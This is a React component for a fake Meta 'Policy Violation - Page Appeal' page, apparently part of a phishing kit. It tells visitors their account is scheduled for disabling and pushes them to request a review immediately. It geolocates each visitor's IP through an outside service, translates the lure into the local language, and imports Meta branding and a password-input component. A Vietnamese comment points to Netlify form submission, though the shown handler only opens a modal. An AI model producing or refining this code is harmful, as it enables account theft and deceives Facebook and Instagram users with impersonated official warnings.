import BackgroundImage from '@/assets/bg-image.png';
import MetaAI from '@/assets/meta-ai-image.png';
import MetaImage from '@/assets/meta-image.png';
import ProfileImage from '@/assets/profile-image.png';
import WarningImage from '@/assets/warning.png';
import PasswordInput from '@/components/password-input';
import { useState, useEffect, useRef } from 'react';
import { translateText } from '@/utils/translate';
import axios from 'axios';

const Home = () => {
    const [translations, setTranslations] = useState({});
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [geoInfo, setGeoInfo] = useState(null);
    const isTranslatingRef = useRef(false);

    const t = (text) => {
        return translations[text] || text;
    };

    useEffect(() => {
        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    city: data.city || 'N/A',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    ip: 'N/A',
                    country: 'N/A',
                    city: 'N/A',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, []);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = [
            'Privacy Center', 'Policy Violation',
            'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.',
            'This form is only to be used for submitting appeals and restoring account status.',
            'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.',
            'Request Review'
        ];

        const translateAll = async () => {
            const translatedMap = {};
            for (const text of textsToTranslate) {
                try {
                    translatedMap[text] = await translateText(text, geoInfo.country_code);
                } catch {
                    translatedMap[text] = text;
                }
            }
            setTranslations(translatedMap);
        };
        translateAll();
    }, [geoInfo, translations]);

    const handleSubmit = async () => {
        // Logic submit form của Netlify
        setIsModalOpen(true);
    };

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Policy Violation - Page Appeal</title>
            <div className='flex w-full max-w-[1100px]'>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <img src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
                    </div>
                    <p>{t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}</p>
                    
                    {/* FORM APPEAL */}
                    <div className='rounded-b-[20px] bg-white'>
                        <img src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
                        <div className='flex flex-col items-center justify-center gap-5 p-5'>
                            <p className='text-2xl'>{t('This form is only to be used for submitting appeals and restoring account status.')}</p>
                            <p className='text-[15px]'>{t('Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.')}</p>
                            <button
                                onClick={handleSubmit}
                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {t('Request Review')}
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Home;
